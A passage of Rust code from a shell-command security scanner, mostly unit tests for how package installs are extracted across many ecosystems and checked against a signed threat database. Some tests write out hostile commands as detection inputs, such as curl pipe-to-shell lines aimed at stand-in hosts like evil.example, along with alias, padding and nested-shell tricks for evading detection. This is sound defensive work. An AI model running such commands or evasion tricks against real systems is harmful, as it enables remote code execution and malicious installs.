                        let (rule_id, severity, threat_type) = ip_rule_for_source(m.source);
                        findings.push(Finding {
                            rule_id,
                            severity,
                            title: format!("Threat intelligence IP match: {}", ip),
                            description: format!(
                                "IP address {} is flagged by {}.",
                                ip,
                                m.source.label()
                            ),
                            evidence: vec![Evidence::ThreatIntel {
                                source: m.source.label().to_string(),
                                threat_type: threat_type.to_string(),
                                confidence: m.confidence,
                                reference: m.reference_url,
                            }],
                            human_view: None,
                            agent_view: None,
                            mitre_id: None,
                            custom_rule_id: None,
                        });
                    }
                }
            }
        }
    }

    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::threatdb::{Confidence, ThreatDbFormat, ThreatDbWriter, ThreatSource};
    use crate::tokenize;
    use ed25519_dalek::SigningKey;
    use rand_core::OsRng;

    fn tokenize_and_extract(input: &str) -> Vec<PackageRef> {
        tokenize_and_extract_for_shell(input, ShellType::Posix)
    }

    fn tokenize_and_extract_for_shell(input: &str, shell: ShellType) -> Vec<PackageRef> {
        let segments = tokenize::tokenize(input, shell);
        extract_packages_for_shell(&segments, shell)
    }

    #[test]
    fn pip_install_single() {
        let pkgs = tokenize_and_extract("pip install requests");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::PyPI);
        assert_eq!(pkgs[0].name, "requests");
        assert_eq!(pkgs[0].version, VersionIntent::Unspecified);
    }

    #[test]
    fn pip_install_with_version() {
        let pkgs = tokenize_and_extract("pip install requests==2.31.0");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "requests");
        assert_eq!(pkgs[0].version, VersionIntent::Exact("2.31".to_string()));
    }

    #[test]
    fn pip_install_version_range_is_constraint() {
        let pkgs = tokenize_and_extract("pip install requests>=2.0");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "requests");
        // A range is now preserved as a parsed Constraint (no longer dropped).
        match &pkgs[0].version {
            VersionIntent::Constraint { raw, parsed } => {
                assert_eq!(raw, ">=2.0");
                assert!(parsed.is_some());
            }
            other => panic!("expected Constraint, got {other:?}"),
        }
    }

    #[test]
    fn pip3_install() {
        let pkgs = tokenize_and_extract("pip3 install flask");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::PyPI);
        assert_eq!(pkgs[0].name, "flask");
    }

    #[test]
    fn uv_install() {
        let pkgs = tokenize_and_extract("uv install numpy");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::PyPI);
        assert_eq!(pkgs[0].name, "numpy");
    }

    #[test]
    fn pip_install_multiple() {
        let pkgs = tokenize_and_extract("pip install requests flask django");
        assert_eq!(pkgs.len(), 3);
        assert_eq!(pkgs[0].name, "requests");
        assert_eq!(pkgs[1].name, "flask");
        assert_eq!(pkgs[2].name, "django");
    }

    #[test]
    fn pip_install_with_extras() {
        let pkgs = tokenize_and_extract("pip install requests[security]==2.31.0");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "requests");
        assert_eq!(pkgs[0].version, VersionIntent::Exact("2.31".to_string()));
    }

    #[test]
    fn pip_install_strips_pep508_marker_before_identity_and_version_parsing() {
        let pkgs = tokenize_and_extract(
            r#"pip install 'Requests[security]==2.31.0; sys_platform == "win/32"'"#,
        );
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "requests");
        assert_eq!(pkgs[0].version, VersionIntent::Exact("2.31".to_string()));
    }

    #[test]
    fn pip_install_normalizes_spaced_and_parenthesized_specifiers() {
        for requirement in [
            "requests == 2.31.0",
            "requests (==2.31.0)",
            "requests[security] ( == 2.31.0 )",
        ] {
            let pkgs = extract_packages(&[Segment {
                byte_range: 0..requirement.len(),
                raw: requirement.to_string(),
                command: Some("pip".to_string()),
                args: vec!["install".to_string(), requirement.to_string()],
                preceding_separator: None,
            }]);
            assert_eq!(pkgs.len(), 1, "requirement={requirement}");
            assert_eq!(pkgs[0].name, "requests", "requirement={requirement}");
            assert_eq!(
                pkgs[0].version,
                VersionIntent::Exact("2.31".to_string()),
                "requirement={requirement}"
            );
        }

        let compatible_requirement = "requests ~= 2.31.0";
        let compatible = extract_packages(&[Segment {
            byte_range: 0..compatible_requirement.len(),
            raw: compatible_requirement.to_string(),
            command: Some("pip".to_string()),
            args: vec!["install".to_string(), compatible_requirement.to_string()],
            preceding_separator: None,
        }]);
        assert_eq!(compatible[0].name, "requests");
        assert!(matches!(
            &compatible[0].version,
            VersionIntent::Constraint { raw, .. } if raw == "~= 2.31.0"
        ));
    }

    #[test]
    fn pip_install_skips_flags() {
        let pkgs =
            tokenize_and_extract("pip install --index-url https://pypi.org/simple/ requests");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "requests");
    }

    #[test]
    fn pip_install_skips_url() {
        let pkgs =
            tokenize_and_extract("pip install git+https://github.com/user/repo.git requests");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "requests");
    }

    #[test]
    fn pip_install_skips_named_direct_references() {
        for requirement in [
            "demo @ git+ssh:host/repo",
            "demo@git+file:./repo",
            "nested/evil@pkg",
        ] {
            let pkgs = extract_packages(&[Segment {
                byte_range: 0..requirement.len(),
                raw: requirement.to_string(),
                command: Some("pip".to_string()),
                args: vec!["install".to_string(), requirement.to_string()],
                preceding_separator: None,
            }]);
            assert!(pkgs.is_empty(), "requirement={requirement}");
        }
    }

    #[test]
    fn pip_install_skips_local_path() {
        let pkgs = tokenize_and_extract("pip install ./local_pkg requests");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "requests");
    }

    #[test]
    fn pip_normalizes_name() {
        let pkgs = tokenize_and_extract("pip install My_Package.Name");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "my-package-name");
    }

    #[test]
    fn pip_no_install_subcommand() {
        let pkgs = tokenize_and_extract("pip freeze");
        assert!(pkgs.is_empty());
    }

    #[test]
    fn wrapped_package_commands_use_effective_identity() {
        for command in [
            "sudo pip install malware-pkg",
            "env REGION=test npm install evil-package@1.0.0",
            "command npx --package=evil-package@1.0.0 entrypoint",
            "time -p gem install malicious-gem",
            "doas -u root cargo install suspicious-crate",
            "sudo env REGION=test command pip install malware-pkg",
        ] {
            assert_eq!(
                tokenize_and_extract(command).len(),
                1,
                "wrapped package command was not resolved: {command}"
            );
        }
    }

    #[test]
    fn platform_qualified_package_commands_normalize_paths_and_suffixes() {
        for command in [
            r"C:\Tools\Python\PIP.EXE INSTALL malware-pkg",
            r"C:\Tools\node\npm.cmd install evil-package@1.0.0",
            r"C:/Tools/node/npx.com --package=evil-package@1.0.0 entrypoint",
            r"C:\Tools\gradle\gradlew.bat com.evil:plugin:1.0",
        ] {
            let pkgs = tokenize_and_extract_for_shell(command, ShellType::PowerShell);
            assert_eq!(
                pkgs.len(),
                1,
                "platform launcher was not resolved: {command}"
            );
        }

        let quoted_cmd = tokenize_and_extract_for_shell(
            r#""C:\Program Files\Python\pip.exe" install malware-pkg"#,
            ShellType::Cmd,
        );
        assert_eq!(quoted_cmd.len(), 1, "quoted Cmd executable path was missed");
    }

    #[test]
    fn quoted_package_arguments_are_normalized_for_the_selected_shell() {
        let posix = tokenize_and_extract("pip install 'malware-pkg'");
        assert_eq!(posix[0].name, "malware-pkg");

        let powershell = tokenize_and_extract_for_shell(
            r#"npm.cmd install "evil-package@1.0.0""#,
            ShellType::PowerShell,
        );
        assert_eq!(powershell[0].name, "evil-package");
        assert_eq!(
            powershell[0].version,
            VersionIntent::Exact("1.0.0".to_string())
        );
    }

    #[test]
    fn npm_install_single() {
        let pkgs = tokenize_and_extract("npm install lodash");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::Npm);
        assert_eq!(pkgs[0].name, "lodash");
        assert_eq!(pkgs[0].version, VersionIntent::Unspecified);
    }

    #[test]
    fn npm_install_with_version() {
        let pkgs = tokenize_and_extract("npm install lodash@4.17.21");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "lodash");
        assert_eq!(pkgs[0].version, VersionIntent::Exact("4.17.21".to_string()));
    }

    #[test]
    fn npm_install_scoped() {
        let pkgs = tokenize_and_extract("npm install @angular/core@16.0.0");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "@angular/core");
        assert_eq!(pkgs[0].version, VersionIntent::Exact("16.0.0".to_string()));
    }

    #[test]
    fn npm_alias_uses_target_identity_and_keeps_alias_as_presentation_only() {
        for (command, target, alias) in [
            ("npm install safe@npm:knownbad@1.2.3", "knownbad", "safe"),
            (
                "npm install @friendly/safe@npm:@hostile/knownbad@1.2.3",
                "@hostile/knownbad",
                "@friendly/safe",
            ),
        ] {
            let pkgs = tokenize_and_extract(command);
            assert_eq!(pkgs.len(), 1, "{command}");
            assert_eq!(pkgs[0].name, target);
            assert_eq!(pkgs[0].alias.as_deref(), Some(alias));
            assert_eq!(pkgs[0].version, VersionIntent::Exact("1.2.3".to_string()));
        }
    }

    #[test]
    fn npm_alias_command_cannot_bypass_target_threat_record() {
        let key = SigningKey::generate(&mut OsRng);
        let mut writer = ThreatDbWriter::new(1_700_000_000, 90);
        writer.add_package(
            Ecosystem::Npm,
            "knownbad",
            &["1.2.3"],
            ThreatSource::OssfMalicious,
            Confidence::Confirmed,
            false,
            None,
        );
        let db = ThreatDb::from_bytes(writer.build(&key).expect("build"), 0).expect("load");

        let findings = check(
            "npm install safe@npm:knownbad@1.2.3",
            ShellType::Posix,
            &[],
            Some(&db),
        );
        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == RuleId::ThreatMaliciousPackage)
            .expect("the target package must be assessed");
        assert_eq!(finding.severity, Severity::Critical);
        assert!(finding.title.contains("safe (npm alias for knownbad)"));

        let clean = check(
            "npm install safe@npm:knownbad@2.0.0",
            ShellType::Posix,
            &[],
            Some(&db),
        );
        assert!(!clean
            .iter()
            .any(|finding| finding.rule_id == RuleId::ThreatMaliciousPackage));
    }

    /// Padding a command line with filler names must not push a real operand
    /// past the extraction cap and out of the assessment. Where the cap does
    /// bind, the verdict says so rather than reporting a partial assessment as
    /// a complete one.
    #[test]
    fn padding_a_command_line_cannot_hide_a_package_from_assessment() {
        let key = SigningKey::generate(&mut OsRng);
        let mut writer = ThreatDbWriter::new(1_700_000_000, 91);
        writer.add_package(
            Ecosystem::Npm,
            "knownbad",
            &[],
            ThreatSource::OssfMalicious,
            Confidence::Confirmed,
            true,
            None,
        );
        let db = ThreatDb::from_bytes(writer.build(&key).expect("build"), 0).expect("load");

        let padded = |count: usize| {
            let mut command = String::from("npm install");
            for index in 0..count {
                command.push_str(&format!(" tirith-synthetic-filler-{index}"));
            }
            command.push_str(" knownbad@1.0.0");
            command
        };

        // Just under the cap: the trailing package is assessed as usual.
        let findings = check(&padded(64), ShellType::Posix, &[], Some(&db));
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::ThreatMaliciousPackage),
            "a 65-package line must still assess its last package"
        );
        assert!(
            !findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
            "nothing was cut, so nothing is disclosed"
        );

        // Past the cap: the cut is disclosed instead of being silent.
        let over = check(
            &padded(crate::npm_command::MAX_PACKAGES_PER_INVOCATION + 10),
            ShellType::Posix,
            &[],
            Some(&db),
        );
        assert!(
            over.iter()
                .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete
                    && finding.severity == Severity::High),
            "a truncated package list must never read as a complete assessment"
        );
    }

    /// The threat-intelligence path must see the same install forms the rest of
    /// the tree already knows are installs.
    #[test]
    fn prefix_word_and_alias_installs_reach_the_threat_db() {
        let key = SigningKey::generate(&mut OsRng);
        let mut writer = ThreatDbWriter::new(1_700_000_000, 92);
        writer.add_package(
            Ecosystem::Npm,
            "knownbad",
            &[],
            ThreatSource::OssfMalicious,
            Confidence::Confirmed,
            true,
            None,
        );
        let db = ThreatDb::from_bytes(writer.build(&key).expect("build"), 0).expect("load");

        for command in [
            "yarn add knownbad",
            "yarn global add knownbad",
            "yarn workspace web add knownbad",
            "yarn workspaces foreach add knownbad",
            "yarn --network-timeout 100000 add knownbad",
            "npm isntall knownbad",
            "npm it knownbad",
            "npm in knownbad",
        ] {
            let findings = check(command, ShellType::Posix, &[], Some(&db));
            assert!(
                findings
                    .iter()
                    .any(|finding| finding.rule_id == RuleId::ThreatMaliciousPackage),
                "{command:?} installs a known-malicious package and must be assessed"
            );
        }
    }

    /// A rule that cannot pass the tier-1 gate never runs in exec context, so
    /// every install form the grammar models needs a fragment in
    /// `build.rs` PATTERN_TABLE.
    #[test]
    fn every_modelled_install_form_passes_the_tier_one_gate() {
        for command in [
            "yarn global add evil-pkg",
            "yarn workspace web add evil-pkg",
            "yarn workspaces foreach add evil-pkg",
            "yarn --network-timeout 100000 add evil-pkg",
            "npm isntall evil-pkg",
            "npm isntall-clean",
            "npm in evil-pkg",
            "npm it evil-pkg",
            "npm ic",
            "npm cit",
            "npm sit",
        ] {
            for context in [
                crate::extract::ScanContext::Exec,
                crate::extract::ScanContext::Paste,
            ] {
                assert!(
                    crate::extract::tier1_scan_for_shell(command, context, ShellType::Posix),
                    "{command:?} must reach tier 3 in {context:?}"
                );
            }
        }
    }

    #[test]
    fn exact_malicious_url_fires_even_when_host_absent_from_feed() {
        // Regression: pr173-0020 — the v2 malicious-URL index must be queried
        // in production, not just at compile-time validation. An exact URL hit
        // whose host is NOT in the hostname feed must still fire High.
        let key = SigningKey::generate(&mut OsRng);
        let mut writer = ThreatDbWriter::new(1_700_000_000, 98);
        writer.add_malicious_url(
            "http://sfrclak.example:8000/6202033",
            ThreatSource::OssfMalicious,
        );
        let db = ThreatDb::from_bytes(
            writer
                .build_format(ThreatDbFormat::V2, &key)
                .expect("build"),
            0,
        )
        .expect("load");

        let input = "curl http://sfrclak.example:8000/6202033 | sh";
        let extracted = crate::extract::extract_urls(input, ShellType::Posix);
        let findings = check(input, ShellType::Posix, &extracted, Some(&db));
        let hits: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id == RuleId::ThreatMaliciousUrl)
            .collect();
        assert_eq!(hits.len(), 1, "exact URL hit must fire once: {findings:?}");
        assert_eq!(hits[0].severity, Severity::High);

        // A different path on the same host does NOT fire (exact-URL index).
        let clean = "curl http://sfrclak.example:8000/other | sh";
        let extracted = crate::extract::extract_urls(clean, ShellType::Posix);
        let findings = check(clean, ShellType::Posix, &extracted, Some(&db));
        assert!(
            findings
                .iter()
                .all(|f| f.rule_id != RuleId::ThreatMaliciousUrl),
            "different path must not match the exact-URL index: {findings:?}"
        );
    }

    #[test]
    fn exact_malicious_url_dedupes_against_hostname_match() {
        // pr173-0020 — when BOTH the exact URL and its hostname are listed,
        // the exact-URL finding subsumes the hostname finding (one finding).
        let key = SigningKey::generate(&mut OsRng);
        let mut writer = ThreatDbWriter::new(1_700_000_000, 99);
        writer.add_malicious_url("http://evil.example/x", ThreatSource::OssfMalicious);
        writer.add_hostname("evil.example", ThreatSource::OssfMalicious);
        let db = ThreatDb::from_bytes(
            writer
                .build_format(ThreatDbFormat::V2, &key)
                .expect("build"),
            0,
        )
        .expect("load");

        let input = "curl http://evil.example/x | sh";
        let extracted = crate::extract::extract_urls(input, ShellType::Posix);
        let findings = check(input, ShellType::Posix, &extracted, Some(&db));
        let hits = findings
            .iter()
            .filter(|f| f.rule_id == RuleId::ThreatMaliciousUrl)
            .count();
        assert_eq!(hits, 1, "exact + hostname must dedupe to one: {findings:?}");
    }

    #[test]
    fn malicious_package_in_nested_executable_body_reaches_threat_intel() {
        let key = SigningKey::generate(&mut OsRng);
        let mut writer = ThreatDbWriter::new(1_700_000_000, 96);
        writer.add_package(
            Ecosystem::Npm,
            "known-bad",
            &[],
            ThreatSource::OssfMalicious,
            Confidence::Confirmed,
            true,
            None,
        );
        let db = ThreatDb::from_bytes(writer.build(&key).expect("build"), 0).expect("load");

        for (input, shell) in [
            ("echo $(npm install known-bad)", ShellType::Posix),
            ("sh -c 'npm install known-bad'", ShellType::Posix),
            ("& { npm install known-bad }", ShellType::PowerShell),
        ] {
            let findings = check(input, shell, &[], Some(&db));
            assert!(
                findings.iter().any(|finding| {
                    finding.rule_id == RuleId::ThreatMaliciousPackage
                        && finding.severity == Severity::Critical
                }),
                "nested package escaped threat intel: {input} -> {findings:?}"
            );
        }

        let dormant = check(
            "$block = { npm install known-bad }",
            ShellType::PowerShell,
            &[],
            Some(&db),
        );
        assert!(dormant
            .iter()
            .all(|finding| finding.rule_id != RuleId::ThreatMaliciousPackage));
    }

    #[test]
    fn npm_bare_protocol_spec_cannot_bypass_target_threat_record() {
        let parsed = tokenize_and_extract("npm install npm:lodash@4.17.21");
        assert_eq!(parsed.len(), 1);
        assert_eq!(parsed[0].name, "lodash");
        assert_eq!(parsed[0].alias, None);
        assert_eq!(
            parsed[0].version,
            VersionIntent::Exact("4.17.21".to_string())
        );
        let scoped = tokenize_and_extract("npm install npm:@hostile/knownbad@1.2.3");
        assert_eq!(scoped.len(), 1);
        assert_eq!(scoped[0].name, "@hostile/knownbad");
        assert_eq!(scoped[0].alias, None);
        assert_eq!(scoped[0].version, VersionIntent::Exact("1.2.3".to_string()));

        let key = SigningKey::generate(&mut OsRng);
        let mut writer = ThreatDbWriter::new(1_700_000_000, 93);
        writer.add_package(
            Ecosystem::Npm,
            "lodash",
            &["4.17.21"],
            ThreatSource::OssfMalicious,
            Confidence::Confirmed,
            false,
            None,
        );
        let db = ThreatDb::from_bytes(writer.build(&key).expect("build"), 0).expect("load");

        let findings = check(
            "npm install npm:lodash@4.17.21",
            ShellType::Posix,
            &[],
            Some(&db),
        );
        assert!(findings.iter().any(|finding| {
            finding.rule_id == RuleId::ThreatMaliciousPackage
                && finding.severity == Severity::Critical
        }));

        let clean = check(
            "npm install npm:lodash@4.17.22",
            ShellType::Posix,
            &[],
            Some(&db),
        );
        assert!(!clean
            .iter()
            .any(|finding| finding.rule_id == RuleId::ThreatMaliciousPackage));
    }

    #[test]
    fn npm_install_scoped_no_version() {
        let pkgs = tokenize_and_extract("npm install @types/node");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "@types/node");
        assert_eq!(pkgs[0].version, VersionIntent::Unspecified);
    }

    #[test]
    fn npm_i_shorthand() {
        let pkgs = tokenize_and_extract("npm i express");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "express");
    }

    #[test]
    fn yarn_add() {
        let pkgs = tokenize_and_extract("yarn add react@18.2.0");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::Npm);
        assert_eq!(pkgs[0].name, "react");
        assert_eq!(pkgs[0].version, VersionIntent::Exact("18.2.0".to_string()));
    }

    #[test]
    fn pnpm_add() {
        let pkgs = tokenize_and_extract("pnpm add vue");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::Npm);
        assert_eq!(pkgs[0].name, "vue");
    }

    #[test]
    fn bun_add() {
        let pkgs = tokenize_and_extract("bun add elysia");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::Npm);
        assert_eq!(pkgs[0].name, "elysia");
    }

    #[test]
    fn npx_package() {
        let pkgs = tokenize_and_extract("npx create-react-app my-app");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::Npm);
        assert_eq!(pkgs[0].name, "create-react-app");
    }

    #[test]
    fn npx_scoped_package() {
        let pkgs = tokenize_and_extract("npx @angular/cli new my-app");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "@angular/cli");
    }

    #[test]
    fn npx_with_package_flag() {
        let pkgs = tokenize_and_extract("npx --package typescript tsc");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "typescript");
    }

    #[test]
    fn npx_attached_package_forms_extract_the_explicit_package() {
        for command in [
            "npx --package=evil-package@1.0.0 entrypoint",
            "npx -pevil-package@1.0.0 entrypoint",
            "npx -p=evil-package@1.0.0 entrypoint",
        ] {
            let pkgs = tokenize_and_extract(command);
            assert_eq!(pkgs.len(), 1, "attached form missed: {command}");
            assert_eq!(pkgs[0].name, "evil-package");
            assert_eq!(pkgs[0].version, VersionIntent::Exact("1.0.0".into()));
        }
    }

    #[test]
    fn npx_collects_every_explicit_package_before_the_entrypoint() {
        let pkgs = tokenize_and_extract(
            "npx --package safe-package -pevil-package@1.0.0 --package=@scope/tool run",
        );
        let names: Vec<&str> = pkgs.iter().map(|pkg| pkg.name.as_str()).collect();
        assert_eq!(names, ["safe-package", "evil-package", "@scope/tool"]);
    }

    #[test]
    fn npx_consumes_value_options_before_inferring_the_package() {
        let pkgs = tokenize_and_extract(
            "npx --registry https://registry.example --script-shell /bin/bash \
             --workspace app evil-package@1.0.0",
        );
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "evil-package");
    }

    #[test]
    fn npx_boolean_options_do_not_consume_the_inferred_package() {
        let pkgs = tokenize_and_extract("npx --yes --quiet evil-package@1.0.0");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "evil-package");

        for option in ["--expect-results", "--optional", "--production", "--color"] {
            let command = format!("npx {option} evil-package@1.0.0");
            let pkgs = tokenize_and_extract(&command);
            assert_eq!(
                pkgs.len(),
                1,
                "Boolean option consumed entrypoint: {option}"
            );
            assert_eq!(pkgs[0].name, "evil-package");
        }
    }

    #[test]
    fn npx_color_consumes_only_its_documented_explicit_values() {
        for value in ["always", "true", "false", "ALWAYS"] {
            let command = format!("npx --color {value} evil-package@1.0.0");
            let pkgs = tokenize_and_extract(&command);
            assert_eq!(pkgs.len(), 1, "color value was not consumed: {value}");
            assert_eq!(pkgs[0].name, "evil-package");
        }
    }

    #[test]
    fn npx_call_value_is_not_inferred_as_a_package() {
        for command in ["npx --call evil-package", "npx -cevil-package"] {
            assert!(
                tokenize_and_extract(command).is_empty(),
                "call command text is not a package: {command}"
            );
        }
    }

    #[test]
    fn npx_options_after_the_entrypoint_belong_to_the_child() {
        let pkgs = tokenize_and_extract("npx safe-package --package=evil-package@1.0.0");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "safe-package");
    }

    #[test]
    fn npx_double_dash_starts_the_inferred_package() {
        let pkgs = tokenize_and_extract("npx -- evil-package@1.0.0 --yes");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "evil-package");
    }

    #[test]
    fn npm_install_skips_save_dev() {
        let pkgs = tokenize_and_extract("npm install --save-dev jest");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "jest");
    }

    #[test]
    fn npm_install_multiple() {
        let pkgs = tokenize_and_extract("npm install react react-dom");
        assert_eq!(pkgs.len(), 2);
        assert_eq!(pkgs[0].name, "react");
        assert_eq!(pkgs[1].name, "react-dom");
    }

    #[test]
    fn cargo_install() {
        let pkgs = tokenize_and_extract("cargo install ripgrep");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::Crates);
        assert_eq!(pkgs[0].name, "ripgrep");
        assert_eq!(pkgs[0].version, VersionIntent::Unspecified);
    }

    #[test]
    fn cargo_add() {
        let pkgs = tokenize_and_extract("cargo add serde");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "serde");
    }

    #[test]
    fn cargo_add_with_version() {
        // Cargo's plain `serde@1.0.193` is a caret REQUIREMENT (^1.0.193), not an exact
        // pin: resolution selects the highest compatible release, so it is a Constraint
        // (matching then resolves the real installed version, not the literal lower bound).
        let pkgs = tokenize_and_extract("cargo add serde@1.0.193");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "serde");
        assert!(
            matches!(&pkgs[0].version, VersionIntent::Constraint { raw, .. } if raw == "1.0.193"),
            "cargo add serde@1.0.193 is a caret constraint, got {:?}",
            pkgs[0].version
        );
    }

    #[test]
    fn cargo_add_equals_is_an_exact_pin() {
        // Cargo's `=` operator IS an exact pin.
        let pkgs = tokenize_and_extract("cargo add serde@=1.0.193");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].version, VersionIntent::Exact("1.0.193".to_string()));
    }

    #[test]
    fn cargo_install_with_version_flag() {
        // `--version 14.0.0` is likewise a SemVer requirement, not an exact pin.
        let pkgs = tokenize_and_extract("cargo install ripgrep --version 14.0.0");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "ripgrep");
        assert!(
            matches!(&pkgs[0].version, VersionIntent::Constraint { raw, .. } if raw == "14.0.0"),
            "cargo install --version 14.0.0 is a constraint, got {:?}",
            pkgs[0].version
        );
    }

    #[test]
    fn cargo_skips_git_url() {
        let pkgs = tokenize_and_extract("cargo install --git https://github.com/user/repo");
        assert!(pkgs.is_empty());
    }

    #[test]
    fn cargo_build_not_install() {
        let pkgs = tokenize_and_extract("cargo build --release");
        assert!(pkgs.is_empty());
    }

    #[test]
    fn gem_install() {
        let pkgs = tokenize_and_extract("gem install rails");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::RubyGems);
        assert_eq!(pkgs[0].name, "rails");
    }

    #[test]
    fn gem_install_with_version_flag() {
        let pkgs = tokenize_and_extract("gem install rails --version 7.0.0");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "rails");
        assert_eq!(pkgs[0].version, VersionIntent::Exact("7".to_string()));
    }

    #[test]
    fn gem_install_with_colon_version() {
        let pkgs = tokenize_and_extract("gem install rails:7.0.0");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "rails");
        assert_eq!(pkgs[0].version, VersionIntent::Exact("7".to_string()));
    }

    #[test]
    fn go_get() {
        let pkgs = tokenize_and_extract("go get github.com/gin-gonic/gin");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::Go);
        assert_eq!(pkgs[0].name, "github.com/gin-gonic/gin");
        assert_eq!(pkgs[0].version, VersionIntent::Unspecified);
    }

    #[test]
    fn go_get_with_version() {
        let pkgs = tokenize_and_extract("go get github.com/gin-gonic/gin@v1.9.1");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "github.com/gin-gonic/gin");
        // Go's `v`-prefixed module version is kept as an exact pin.
        assert_eq!(pkgs[0].version, VersionIntent::Exact("v1.9.1".to_string()));
    }

    #[test]
    fn go_install() {
        let pkgs = tokenize_and_extract("go install golang.org/x/tools/gopls@latest");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "golang.org/x/tools/gopls");
        // `latest` is a dist-tag, not an exact version: an unparsed constraint.
        match &pkgs[0].version {
            VersionIntent::Constraint { raw, parsed } => {
                assert_eq!(raw, "latest");
                assert!(parsed.is_none());
            }
            other => panic!("expected Constraint, got {other:?}"),
        }
    }

    #[test]
    fn composer_require() {
        let pkgs = tokenize_and_extract("composer require monolog/monolog");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::Packagist);
        assert_eq!(pkgs[0].name, "monolog/monolog");
        assert_eq!(pkgs[0].version, VersionIntent::Unspecified);
    }

    #[test]
    fn composer_require_with_version() {
        let pkgs = tokenize_and_extract("composer require monolog/monolog:^3.0");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "monolog/monolog");
        // Composer's caret range is not in the parsed subset: unresolved constraint.
        match &pkgs[0].version {
            VersionIntent::Constraint { raw, parsed } => {
                assert_eq!(raw, "^3.0");
                assert!(parsed.is_none());
            }
            other => panic!("expected Constraint, got {other:?}"),
        }
    }

    #[test]
    fn dotnet_add_package() {
        let pkgs = tokenize_and_extract("dotnet add package Newtonsoft.Json");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::NuGet);
        assert_eq!(pkgs[0].name, "Newtonsoft.Json");
        assert_eq!(pkgs[0].version, VersionIntent::Unspecified);
    }

    #[test]
    fn dotnet_add_package_with_version() {
        let pkgs = tokenize_and_extract("dotnet add package Newtonsoft.Json --version 13.0.3");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "Newtonsoft.Json");
        assert_eq!(pkgs[0].version, VersionIntent::Exact("13.0.3".to_string()));
    }

    #[test]
    fn maven_plugin_coordinate_is_extracted() {
        let pkgs = tokenize_and_extract("mvn com.evil:malicious-plugin:1.0:run");
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::Maven);
        assert_eq!(pkgs[0].name, "com.evil:malicious-plugin");
        assert_eq!(pkgs[0].version, VersionIntent::Exact("1.0".to_string()));
    }

    #[test]
    fn maven_wrapper_dependency_get_coordinate_is_extracted() {
        let pkgs = tokenize_and_extract(
            "./mvnw dependency:get -Dartifact=com.evil:malicious-plugin:1.0:jar",
        );
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].name, "com.evil:malicious-plugin");
        assert_eq!(pkgs[0].version, VersionIntent::Exact("1.0".to_string()));
    }

    #[test]
    fn gradle_wrapper_coordinate_is_extracted() {
        let pkgs = tokenize_and_extract_for_shell(
            r"C:\repo\gradlew.bat com.evil:malicious-plugin:1.0",
            ShellType::Cmd,
        );
        assert_eq!(pkgs.len(), 1);
        assert_eq!(pkgs[0].ecosystem, Ecosystem::Maven);
        assert_eq!(pkgs[0].name, "com.evil:malicious-plugin");
    }

    #[test]
    fn no_packages_in_ls() {
        let pkgs = tokenize_and_extract("ls -la");
        assert!(pkgs.is_empty());
    }

    #[test]
    fn no_packages_in_echo() {
